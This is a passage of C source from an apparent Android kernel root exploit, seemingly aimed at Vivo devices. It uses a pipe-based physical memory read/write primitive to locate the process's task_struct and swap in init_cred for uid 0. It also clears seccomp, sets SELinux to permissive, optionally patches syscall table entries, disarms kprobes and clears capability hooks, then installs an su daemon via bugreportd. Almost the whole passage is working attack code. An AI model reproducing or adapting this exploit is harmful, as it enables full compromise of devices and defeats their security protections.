      if (n > 0 && proc_comm[n - 1] == '\n') {
        proc_comm[n - 1] = '\0';
      }
    }
    pr_info("root nosetuid userspace comm=%s want=%s\n", proc_comm, want_comm);
    fflush(stdout);
  }

  uint64_t tasks_next = pipe_read64(fd, data_addr(INIT_TASK_TASKS));
  init_tasks_prev = pipe_read64(fd, data_addr(INIT_TASK_TASKS) + 8);
  pr_info("root nosetuid tasks next=%016llx prev=%016llx self=%d uid=%u "
          "comm=%s\n",
          (unsigned long long)tasks_next,
          (unsigned long long)init_tasks_prev, (int)self, root_uid_before,
          want_comm);

  /*
   * Probe: configfs can read our GhostLock page (linear map). If this fails,
   * heap R/W is dead and walking tasks will panic.
   */
  {
    uint64_t probe = 0;
    int pok = pipe_phys_read_data(fd, page_base + FOPS_TABLE_OFF, &probe, 8);
    pr_info("root nosetuid linear probe ok=%d page=%016zx val=%016llx\n", pok,
            page_base, (unsigned long long)probe);
    fflush(stdout);
    if (!pok) {
      return 0;
    }
  }

  /*
   * Heap task_struct R/W via configfs panics on unreclaimed linear pages.
   * Magisk succeeded with pipe physrw. Refuse walk unless pipe is live
   * (unless ROOT_FORCE_CONFIGFS_WALK=1 for experiments).
   */
  current_task_addr = 0;
  if (pipebuf_pipe_idx < 0 || pipebuf_page_base == 0) {
    if (!env_flag("ROOT_FORCE_CONFIGFS_WALK", 0)) {
      pr_info("root nosetuid skip task walk — no pipe physrw "
              "(pipeidx=%d page=%016zx); need safe pipe hit\n",
              pipebuf_pipe_idx, pipebuf_page_base);
      fflush(stdout);
      return 0;
    }
    pr_warning("root nosetuid FORCE configfs walk (may panic)\n");
    fflush(stdout);
  }

  /*
   * Newest tasks sit near list tail (tasks.prev). Reverse first with pipe —
   * forward from init walks 1000+ kernel threads before our sh.
   */
  if (is_direct_ptr(init_tasks_prev)) {
    uint64_t entry = init_tasks_prev;
    uint64_t head = data_addr(INIT_TASK_TASKS);
    uint64_t chead = canon_addr(INIT_TASK_TASKS);
    pr_info("root nosetuid reverse walk begin want=%u comm=%s prev=%016llx\n",
            (uint32_t)self, want_comm, (unsigned long long)entry);
    fflush(stdout);
    for (int i = 0; i < 256; i++) {
      if (entry == head || entry == chead) {
        break;
      }
      if (!is_direct_ptr(entry)) {
        break;
      }
      uint64_t task = entry - TASK_TASKS_OFF;
      uint32_t tgid = pipe_read32(fd, task + TASK_TGID_OFF);
      if (tgid == (uint32_t)self) {
        char comm[TASK_COMM_LEN + 1];
        memset(comm, 0, sizeof(comm));
        pipe_phys_read_data(fd, task + TASK_COMM_OFF, comm, TASK_COMM_LEN);
        pr_info("root nosetuid reverse[%d] task=%016llx tgid=%u comm=%s\n", i,
                (unsigned long long)task, tgid, comm);
        fflush(stdout);
        if (tgid == (uint32_t)self) {
          current_task_addr = task;
          task_walk_iters = i + 1;
          break;
        }
      }
      entry = pipe_read64(fd, entry + 8);
    }
  }
  if (!current_task_addr) {
    pr_info("root nosetuid reverse miss — forward walk want=%u\n",
            (uint32_t)self);
    fflush(stdout);
    current_task_addr = find_task_by_tgid(fd, (uint32_t)self);
  }
  if (!current_task_addr) {
    pr_info("root nosetuid task walk failed want=%u iters=%d last=%016llx\n",
            (uint32_t)self, task_walk_iters,
            (unsigned long long)task_walk_last_entry);
    fflush(stdout);
    return 0;
  }

  found_task_pid = pipe_read32(fd, current_task_addr + TASK_PID_OFF);
  found_task_tgid = pipe_read32(fd, current_task_addr + TASK_TGID_OFF);
  memset(found_task_comm, 0, sizeof(found_task_comm));
  pipe_phys_read_data(
      fd, current_task_addr + TASK_COMM_OFF, found_task_comm, TASK_COMM_LEN);
  pr_info("root nosetuid task=%016llx pid=%u tgid=%u comm=%s\n",
          (unsigned long long)current_task_addr, found_task_pid,
          found_task_tgid, found_task_comm);

  /* Prove task_struct is `current`: poke comm, read /proc/self/comm. */
  {
    char marker[TASK_COMM_LEN];
    char proc_comm[TASK_COMM_LEN + 1];
    snprintf(marker, sizeof(marker), "X%x", (unsigned)self);
    int is_current = 0;
    for (int try = 0; try < 8 && !is_current; try++) {
      if (!current_task_addr) {
        break;
      }
      pipe_phys_write_data(
          fd, current_task_addr + TASK_COMM_OFF, marker, TASK_COMM_LEN);
      memset(proc_comm, 0, sizeof(proc_comm));
      int cfd = open("/proc/self/comm", O_RDONLY);
      if (cfd >= 0) {
        ssize_t n = read(cfd, proc_comm, TASK_COMM_LEN);
        close(cfd);
        if (n > 0 && proc_comm[n - 1] == '\n') {
          proc_comm[n - 1] = '\0';
        }
      }
      is_current = (strcmp(marker, proc_comm) == 0);
      pr_info("root nosetuid current-check try=%d task=%016llx mark=%s "
              "proc=%s match=%d\n",
              try, (unsigned long long)current_task_addr, marker, proc_comm,
              is_current);
      fflush(stdout);
      if (is_current) {
        break;
      }
      /* Keep walking reverse for another tgid match. */
      current_task_addr = 0;
      if (is_direct_ptr(init_tasks_prev)) {
        uint64_t entry = init_tasks_prev;
        uint64_t head = data_addr(INIT_TASK_TASKS);
        uint64_t chead = canon_addr(INIT_TASK_TASKS);
        int skip = try + 1;
        for (int i = 0; i < 256; i++) {
          if (entry == head || entry == chead || !is_direct_ptr(entry)) {
            break;
          }
          uint64_t task = entry - TASK_TASKS_OFF;
          uint32_t tgid = pipe_read32(fd, task + TASK_TGID_OFF);
          if (tgid == (uint32_t)self) {
            if (skip == 0) {
              current_task_addr = task;
              break;
            }
            skip--;
          }
          entry = pipe_read64(fd, entry + 8);
        }
      }
    }
    if (!is_current) {
      pr_info("root nosetuid WRONG task_struct — abort before cred poke\n");
      fflush(stdout);
      return 0;
    }
  }

  if (!clear_vr_tags(fd, current_task_addr)) {
    pr_info("root nosetuid vr detag failed\n");
    fflush(stdout);
    return 0;
  }
  pr_info("root nosetuid vr detag ok — installing init_cred (VR-safe)\n");
  fflush(stdout);

  /*
   * Vivo VR: /proc may show a forged page cred (uid 0) while geteuid/fchown
   * still use the live shell cred. Only swinging to the canonical init_cred
   * satisfies the VR guard and makes syscalls see uid 0.
   */
#if defined(VR_CRED_GUARD_INIT_CRED) && VR_CRED_GUARD_INIT_CRED
  {
    uintptr_t old_real = 0, old_cred = 0;
    if (!install_vr_safe_init_cred(fd, current_task_addr, &old_real,
                                   &old_cred)) {
      pr_info("root nosetuid init_cred install failed — fallback forge\n");
      fflush(stdout);
      current_real_cred_addr =
          pipe_read64(fd, current_task_addr + TASK_REAL_CRED_OFF);
      current_cred_addr = pipe_read64(fd, current_task_addr + TASK_CRED_OFF);
      if (!is_kernel_ptr(current_cred_addr) ||
          !patch_cred_identity(fd, current_cred_addr)) {
        pr_info("root nosetuid patch cred identity failed\n");
        fflush(stdout);
        return 0;
      }
    } else {
      current_real_cred_addr = canon_addr(INIT_CRED);
      current_cred_addr = canon_addr(INIT_CRED);
      pr_info("root nosetuid init_cred installed cred=%016llx "
              "old_cred=%016llx\n",
              (unsigned long long)current_cred_addr,
              (unsigned long long)old_cred);
      fflush(stdout);
      /*
       * Dual-view probes (SCT / geteuid body / kprobes flag) are optional —
       * default path stays lean for hit-rate. Set ROOT_PROBE_DUALVIEW=1.
       */
      if (env_flag("ROOT_PROBE_DUALVIEW", 0)) {
#if defined(SYS_CALL_TABLE) && defined(SYS_GETEUID_CFI_JT)
      {
        const uintptr_t sct = data_addr(SYS_CALL_TABLE);
        const struct {
          unsigned nr;
          uintptr_t want_img;
          const char *name;
        } slots[] = {
            {174, SYS_GETUID_CFI_JT, "getuid"},
            {175, SYS_GETEUID_CFI_JT, "geteuid"},
            {176, SYS_GETGID_CFI_JT, "getgid"},
            {177, SYS_GETEGID_CFI_JT, "getegid"},
        };
        int do_fix = env_flag("ROOT_FIX_SCT", 0);
        for (size_t i = 0; i < sizeof(slots) / sizeof(slots[0]); i++) {
          uintptr_t slot = sct + (uintptr_t)slots[i].nr * 8u;
          uintptr_t want = text_addr(slots[i].want_img);
          uintptr_t got = pipe_read64(fd, slot);
          pr_info("root nosetuid sct[%u]/%s got=%016llx want=%016llx "
                  "match=%d\n",
                  slots[i].nr, slots[i].name, (unsigned long long)got,
                  (unsigned long long)want, got == want);
          fflush(stdout);
          if (do_fix && got != want) {
            int ok = pipe_write64(fd, slot, want);
            uintptr_t rb = pipe_read64(fd, slot);
            pr_info("root nosetuid sct[%u] fix ok=%d rb=%016llx\n",
                    slots[i].nr, ok, (unsigned long long)rb);
            fflush(stdout);
          }
        }
        pr_info("root nosetuid after sct probe nr_geteuid=%ld\n",
                syscall(__NR_geteuid));
        fflush(stdout);
      }
#endif
#if defined(SYS_GETEUID_BODY)
      {
        uint32_t insn[4] = {0};
        uintptr_t body = text_addr(SYS_GETEUID_BODY);
        pipe_phys_read_data(fd, body, insn, sizeof(insn));
        pr_info("root nosetuid geteuid_body=%016llx insn=%08x %08x %08x %08x\n",
                (unsigned long long)body, insn[0], insn[1], insn[2], insn[3]);
        fflush(stdout);
      }
#endif
#if defined(KPROBES_ALL_DISARMED)
      {
        uintptr_t flag_addr = data_addr(KPROBES_ALL_DISARMED);
        int before = (int)pipe_read32(fd, flag_addr);
        pr_info("root nosetuid kprobes_all_disarmed=%d nr_geteuid=%ld\n", before,
                syscall(__NR_geteuid));
        fflush(stdout);
        if (env_flag("ROOT_DISARM_KPROBES", 0)) {
          int want = 1;
          int ok = pipe_phys_write_data(fd, flag_addr, &want, sizeof(want));
          int after = (int)pipe_read32(fd, flag_addr);
          pr_info("root nosetuid kprobes_all_disarmed %d -> %d ok=%d "
                  "nr_geteuid=%ld\n",
                  before, after, ok, syscall(__NR_geteuid));
          fflush(stdout);
        }
      }
#endif
#if defined(SECURITY_CAPABLE_HEAD)
      {
        uintptr_t cap_head = data_addr(SECURITY_CAPABLE_HEAD);
        uintptr_t before = pipe_read64(fd, cap_head);
        pr_info("root nosetuid capable_head=%016llx nr_geteuid=%ld\n",
                (unsigned long long)before, syscall(__NR_geteuid));
        fflush(stdout);
        if (env_flag("ROOT_CLEAR_CAPABLE", 0)) {
          int ok = pipe_write64(fd, cap_head, 0);
          uintptr_t after = pipe_read64(fd, cap_head);
          pr_info("root nosetuid capable_head clear ok=%d after=%016llx "
                  "nr=%ld\n",
                  ok, (unsigned long long)after, syscall(__NR_geteuid));
          fflush(stdout);
        }
      }
#endif
      } /* ROOT_PROBE_DUALVIEW */
    }
  }
#else
  current_real_cred_addr =
      pipe_read64(fd, current_task_addr + TASK_REAL_CRED_OFF);
  current_cred_addr = pipe_read64(fd, current_task_addr + TASK_CRED_OFF);
  pr_info("root nosetuid cred ptrs real=%016llx cred=%016llx\n",
          (unsigned long long)current_real_cred_addr,
          (unsigned long long)current_cred_addr);
  fflush(stdout);
  if (!is_kernel_ptr(current_cred_addr)) {
    pr_info("root nosetuid bad cred=%016llx\n",
            (unsigned long long)current_cred_addr);
    return 0;
  }

  {
    uint32_t uid_b = pipe_read32(fd, current_cred_addr + CRED_UID_OFF);
    uint32_t euid_b = pipe_read32(fd, current_cred_addr + CRED_UID_OFF + 16);
    pr_info("root nosetuid cred_uid before uid=%u euid=%u\n", uid_b, euid_b);
    fflush(stdout);
  }

  if (!patch_cred_identity(fd, current_cred_addr)) {
    pr_info("root nosetuid patch cred identity failed\n");
    fflush(stdout);
    return 0;
  }
#endif
  pr_info("root nosetuid identity ok getuid=%u geteuid=%u nr=%ld\n", getuid(),
          geteuid(), syscall(__NR_geteuid));
  fflush(stdout);

  if (!patch_task_seccomp(fd, current_task_addr)) {
    pr_info("root nosetuid seccomp patch failed (continuing)\n");
    fflush(stdout);
  } else {
    pr_info("root nosetuid seccomp cleared getuid=%u nr=%ld\n", getuid(),
            syscall(__NR_geteuid));
    fflush(stdout);
  }

  /* init_cred already has kernel SID — skip live blob SID writes. */
  pr_info("root nosetuid sid assumed init_cred/kernel\n");
  fflush(stdout);

  uint32_t cred_uid_after = pipe_read32(fd, current_cred_addr + CRED_UID_OFF);
  root_uid_after = getuid();
  setuid_ret = -1;
  setgid_ret = -1;

  unsigned st_ru = 1, st_eu = 1, st_su = 1, st_fu = 1;
  {
    FILE *sf = fopen("/proc/self/status", "r");
    if (sf) {
      char line[256];
      while (fgets(line, sizeof(line), sf)) {
        if (strncmp(line, "Uid:", 4) == 0) {
          sscanf(line, "Uid: %u %u %u %u", &st_ru, &st_eu, &st_su, &st_fu);
          break;
        }
      }
      fclose(sf);
    }
  }
  pr_info("root nosetuid done cred_uid=%u getuid=%u geteuid=%u "
          "status=%u/%u/%u/%u\n",
          cred_uid_after, root_uid_after, geteuid(), st_ru, st_eu, st_su,
          st_fu);
  fflush(stdout);

  uint8_t permissive = 0;
  pipe_phys_write_data(fd, selinux_addr, &permissive, sizeof(permissive));
  pipe_phys_read_data(fd, selinux_addr, &selinux_after, sizeof(selinux_after));

  root_child_done = (st_ru == 0 && st_eu == 0 && cred_uid_after == 0);
  if (root_child_done) {
    pr_info("root nosetuid ROOT ok status-uid 0/0 (bionic geteuid may lag)\n");
    fflush(stdout);
    /*
     * Prefer bugreportd→su finish while physrw is live. Shell stays uid 2000.
     * Backend: pagemap+physrw into carrier page cache (no second pipe reclaim).
     * BUGREPORTD_SU=0 disables; BUGREPORTD_SU_PREFLIGHT=1 stops after checks.
     */
    if (env_flag("BUGREPORTD_SU", 1)) {
      int finish_rc = pd2241_bugreportd_su_finish(fd);
      pr_info("bugreportd_su_finish rc=%d shell_uid=%u geteuid=%u\n",
              finish_rc, getuid(), geteuid());
      fflush(stdout);
      if (finish_rc == 0) {
        /*
         * su daemon is live under dumpstate. Further GhostLock configfs
         * teardown/hold has panic'd this build — restore misc and hard-exit.
         */
        (void)restore_misc_list_head();
        int mfd =
            open("/data/local/tmp/.root_ok", O_WRONLY | O_CREAT | O_TRUNC, 0644);
        if (mfd >= 0) {
          const char msg[] = "bugreportd_su PASS\n";
          write(mfd, msg, sizeof(msg) - 1);
          close(mfd);
        }
        pr_info("bugreportd_su PASS — _exit(0) skip GhostLock teardown\n");
        fflush(stdout);
        _exit(0);
      }
    }
    /* Unlink forge before userspace post-actions / process exit. */
    (void)restore_misc_list_head();
    int mfd = open("/data/local/tmp/.root_ok", O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (mfd >= 0) {
      const char msg[] = "status-uid 0/0\n";
      write(mfd, msg, sizeof(msg) - 1);
      close(mfd);
    }
    root_success_post_action();
  }
  return root_child_done;
}
#endif

int install_android_root(int fd) {
#if defined(VR_TAG_A_OFF) && defined(VR_TAG_B_OFF)
  /* Default: no setuid — vr kills on commit_creds with euid/fsuid==0. */
  if (env_flag("ROOT_NO_SETUID", 1)) {
    return install_android_root_nosetuid(fd);
  }
#endif
  root_uid_before = getuid();
  if (!spawn_root_child()) {
    pr_info("root spawn failed child=%d\n", root_child_pid);
    return 0;
  }

  uintptr_t selinux_addr = data_addr(SELINUX_ENFORCING);
  pipe_phys_read_data(fd, selinux_addr, &selinux_before, sizeof(selinux_before));
  selinux_cred_blob_off =
    pipe_read32(fd, data_addr(SELINUX_BLOB_SIZES));
  target_cred_osid = SELINUX_KERNEL_SID;
  target_cred_sid = SELINUX_KERNEL_SID;

  init_tasks_prev = pipe_read64(fd, data_addr(INIT_TASK_TASKS) + 8);
  if (!is_direct_ptr(current_task_addr)) {
    current_task_addr = 0;
  }

  if (!is_kernel_ptr(init_tasks_prev)) {
    pr_info("root bad init_tasks_prev=%016llx\n",
            (unsigned long long)init_tasks_prev);
    return 0;
  }
  current_task_addr = init_tasks_prev - TASK_TASKS_OFF;
  last_task_guess = current_task_addr;

  found_task_pid = pipe_read32(fd, current_task_addr + TASK_PID_OFF);
  found_task_tgid = pipe_read32(fd, current_task_addr + TASK_TGID_OFF);
  memset(found_task_comm, 0, sizeof(found_task_comm));
  pipe_phys_read_data(
      fd, current_task_addr + TASK_COMM_OFF, found_task_comm, TASK_COMM_LEN);
  if (found_task_tgid != (uint32_t)root_child_pid) {
    current_task_addr = find_task_by_tgid(fd, (uint32_t)root_child_pid);
    if (!current_task_addr) {
      pr_info("root task walk failed want=%u iters=%d last=%016llx pid=%u tgid=%u\n",
              (uint32_t)root_child_pid, task_walk_iters,
              (unsigned long long)task_walk_last_entry, task_walk_last_pid,
              task_walk_last_tgid);
      return 0;
    }
  }

#if defined(VR_TAG_A_OFF) && defined(VR_TAG_B_OFF)
  if (!clear_vr_tags(fd, current_task_addr)) {
    pr_info("root vr detag failed task=%016llx\n",
            (unsigned long long)current_task_addr);
    return 0;
  }
#endif

  uintptr_t real_cred_slot = current_task_addr + TASK_REAL_CRED_OFF;
  current_real_cred_addr = pipe_read64(fd, real_cred_slot);
  current_cred_addr = pipe_read64(fd, current_task_addr + TASK_CRED_OFF);
  int vr_init_cred_installed = 0;
#if defined(VR_CRED_GUARD_INIT_CRED) && VR_CRED_GUARD_INIT_CRED
  uintptr_t old_real_cred = current_real_cred_addr;
  uintptr_t old_cred = current_cred_addr;
  if (!install_vr_safe_init_cred(fd, current_task_addr, &old_real_cred,
                                 &old_cred)) {
    pr_info("root vr-safe init_cred install failed task=%016llx\n",
            (unsigned long long)current_task_addr);
    return 0;
  }
  current_real_cred_addr = canon_addr(INIT_CRED);
  current_cred_addr = canon_addr(INIT_CRED);
  vr_init_cred_installed = 1;
#endif
  uintptr_t cred_security_slot = current_cred_addr + CRED_SECURITY_OFF;
  uintptr_t real_security_slot = current_real_cred_addr + CRED_SECURITY_OFF;
  current_cred_security_addr = pipe_read64(fd, cred_security_slot);
  current_real_cred_security_addr = pipe_read64(fd, real_security_slot);
  uintptr_t sid_off = selinux_cred_blob_off + SELINUX_CRED_SID_OFF;
  if (is_direct_ptr(current_cred_security_addr) ||
      is_kernel_ptr(current_cred_security_addr)) {
    uintptr_t sid_addr = current_cred_security_addr + sid_off;
    cred_sid_before = pipe_read32(fd, sid_addr);
  }
  if (is_direct_ptr(current_real_cred_security_addr) ||
      is_kernel_ptr(current_real_cred_security_addr)) {
    uintptr_t sid_addr = current_real_cred_security_addr + sid_off;
    real_cred_sid_before = pipe_read32(fd, sid_addr);
  }
  uint64_t cred_caps_before[CRED_CAP_WORDS] = {0};
  uint64_t real_caps_before[CRED_CAP_WORDS] = {0};
  pipe_phys_read_data(
      fd, current_cred_addr + CRED_CAPS_OFF, cred_caps_before,
      sizeof(cred_caps_before));
  pipe_phys_read_data(
      fd, current_real_cred_addr + CRED_CAPS_OFF, real_caps_before,
      sizeof(real_caps_before));
  if (!vr_init_cred_installed) {
    if (!patch_cred_object(fd, current_cred_addr)) {
      pr_info("root patch cred failed cred=%016llx\n",
              (unsigned long long)current_cred_addr);
      return 0;
    }
    if (current_real_cred_addr != current_cred_addr &&
        !patch_cred_object(fd, current_real_cred_addr)) {
      pr_info("root patch real_cred failed real=%016llx\n",
              (unsigned long long)current_real_cred_addr);
      return 0;
    }
  } else {
    pr_info("root cred object patch skipped: canonical init_cred installed\n");
  }

  if (!patch_task_seccomp(fd, current_task_addr)) {
    pr_info("root patch seccomp failed task=%016llx\n",
            (unsigned long long)current_task_addr);
    return 0;
  }

  uint32_t cred_uid_after = pipe_read32(fd, current_cred_addr + CRED_UID_OFF);
  uint32_t real_uid_after =
    pipe_read32(fd, current_real_cred_addr + CRED_UID_OFF);
  uint64_t cred_caps_after[CRED_CAP_WORDS] = {0};
  uint64_t real_caps_after[CRED_CAP_WORDS] = {0};
  pipe_phys_read_data(
      fd, current_cred_addr + CRED_CAPS_OFF, cred_caps_after,
      sizeof(cred_caps_after));
  pipe_phys_read_data(
      fd, current_real_cred_addr + CRED_CAPS_OFF, real_caps_after,
      sizeof(real_caps_after));
  if (is_direct_ptr(current_cred_security_addr) ||
      is_kernel_ptr(current_cred_security_addr)) {
    uintptr_t sid_addr = current_cred_security_addr + sid_off;
    cred_sid_after = pipe_read32(fd, sid_addr);
  }
  if (is_direct_ptr(current_real_cred_security_addr) ||
      is_kernel_ptr(current_real_cred_security_addr)) {
    uintptr_t sid_addr = current_real_cred_security_addr + sid_off;
    real_cred_sid_after = pipe_read32(fd, sid_addr);
  }
  pr_info("root cred patched uid=%u/%u sid=%u/%u\n", cred_uid_after,
          real_uid_after, cred_sid_after, real_cred_sid_after);
  pr_info("root caps patched cred eff=%016llx/%016llx prm=%016llx/%016llx "
          "amb=%016llx/%016llx bset=%016llx/%016llx real_eff=%016llx/%016llx\n",
          (unsigned long long)cred_caps_before[CRED_CAP_EFFECTIVE],
          (unsigned long long)cred_caps_after[CRED_CAP_EFFECTIVE],
          (unsigned long long)cred_caps_before[CRED_CAP_PERMITTED],
          (unsigned long long)cred_caps_after[CRED_CAP_PERMITTED],
          (unsigned long long)cred_caps_before[CRED_CAP_AMBIENT],
          (unsigned long long)cred_caps_after[CRED_CAP_AMBIENT],
          (unsigned long long)cred_caps_before[CRED_CAP_BSET],
          (unsigned long long)cred_caps_after[CRED_CAP_BSET],
          (unsigned long long)real_caps_before[CRED_CAP_EFFECTIVE],
          (unsigned long long)real_caps_after[CRED_CAP_EFFECTIVE]);

  uint8_t permissive = 0;
  int selinux_direct_ok =
    pipe_phys_write_data(fd, selinux_addr, &permissive, sizeof(permissive));
  uint8_t selinux_mid = 0xff;
  pipe_phys_read_data(fd, selinux_addr, &selinux_mid, sizeof(selinux_mid));
  pr_info("root selinux direct write ok=%d %u->%u\n", selinux_direct_ok,
          selinux_before, selinux_mid);

  capable_head_before = pipe_read64(fd, data_addr(SECURITY_CAPABLE_HEAD));
  root_child_done = collect_root_child();
  struct root_report report;
  memset(&report, 0, sizeof(report));
  if (root_shared) {
    report = root_shared->report;
  }
  capable_head_after = pipe_read64(fd, data_addr(SECURITY_CAPABLE_HEAD));
  pipe_phys_read_data(fd, selinux_addr, &selinux_after, sizeof(selinux_after));
  pr_info("root child result done=%d uid_after=%u setgid=%d/%d setuid=%d/%d "
          "setenforce=%d/%d su=%d/%d daemon=%d wallpaper=%d/%d selinux=%u->%u "
          "cap=%016llx/%016llx\n",
          root_child_done, root_uid_after, report.setgid_ret,
          report.setgid_errno, report.setuid_ret, report.setuid_errno,
          setenforce_ret, setenforce_errno, report.su_install_ret,
          report.su_install_errno, report.su_daemon_pid, report.wallpaper_ret,
          report.wallpaper_errno,
          selinux_before, selinux_after,
          (unsigned long long)capable_head_before,
          (unsigned long long)capable_head_after);
  return root_child_done && selinux_after == 0;
}
